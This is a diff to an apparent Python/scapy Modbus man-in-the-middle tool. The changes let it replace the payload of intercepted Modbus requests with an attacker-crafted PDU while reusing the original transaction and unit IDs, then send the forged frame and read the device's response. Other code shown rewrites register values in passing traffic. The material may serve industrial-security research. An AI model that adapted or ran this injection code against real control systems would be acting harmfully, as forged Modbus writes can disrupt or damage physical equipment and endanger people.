@@ -29,7 +29,7 @@ from datetime import datetime, timezone
 
 try:
     from scapy.all import (
-        sniff, sr1, send, ARP, Ether, TCP, IP, Raw, conf, get_if_hwaddr,sendp,sr
+        sniff, sr1, send, ARP, Ether, TCP, IP, Raw, conf, get_if_hwaddr,sendp,srp1,sr
     )
     from scapy.contrib.modbus import (
     ModbusADURequest,
@@ -208,12 +208,13 @@ def build_pdu(func_code: int):
             startAddr=start_addr, quantityRegisters=len(values), outputsValue=values
         )
 
-    raise ValueError(f"No PDU builder implemented for function code {to_hex(func_code)}")
+    raise ValueError(f"No PDU builder implemented for function code {func_code}")
 
 
 def handle_packet(pkt, port, log_file,mappings,own_mac,crafted_pkt):
+    custom_pkt=False
     if crafted_pkt!="":
-        print(crafted_pkt.show(dump=True))
+        custom_pkt=True
     src = own_mac
     dst = pkt[IP].dst 
 
@@ -245,7 +246,7 @@ def handle_packet(pkt, port, log_file,mappings,own_mac,crafted_pkt):
     log_line(f"{direction} {src:>21} -> {dst:<21}", log_file)
 
     
-    if npkt.haslayer(ModbusADURequest):
+    if npkt.haslayer(ModbusADURequest) and custom_pkt==False:
         original_value = npkt[ModbusADURequest].registerValue
         
         
@@ -265,12 +266,32 @@ def handle_packet(pkt, port, log_file,mappings,own_mac,crafted_pkt):
     #     npkt[ModbusADUResponse].transId=4660
 
     # del p.chksum
+    elif npkt.haslayer(ModbusADURequest) and custom_pkt==True:
+        print("Crafting custom packet")
+        trans_id = npkt[ModbusADURequest].transId
+        unit_id = npkt[ModbusADURequest].unitId
+        # print("Current Packet:")
+        # print(npkt.show(dump=True))
+        # print("-"*16)
+
+        stripped = npkt.copy()
+        stripped[TCP].remove_payload()
+        modbus_payload = ModbusADURequest(transId=trans_id, unitId=unit_id) / crafted_pkt
+
+        npkt = stripped / modbus_payload
+
     del npkt[TCP].chksum
     del npkt[IP].chksum
 
+    # print("Modified Packet:")
     # print(npkt.show(dump=True))
-    sendp(npkt,loop=0,inter=0.2,verbose=0) #try making this send and recieve to analysis the response
- 
+    # sendp(npkt,loop=0,inter=0.2,verbose=0) #try making this send and recieve to analysis the response
+    response = srp1(npkt, timeout=3, verbose=0)
+    if response:
+        print("Response received:")
+        response.show()
+    else:
+        print("No response — device may be down, dropping packets, or filtering the request")
 
 def banner():
     print(f'''                                                                                                 
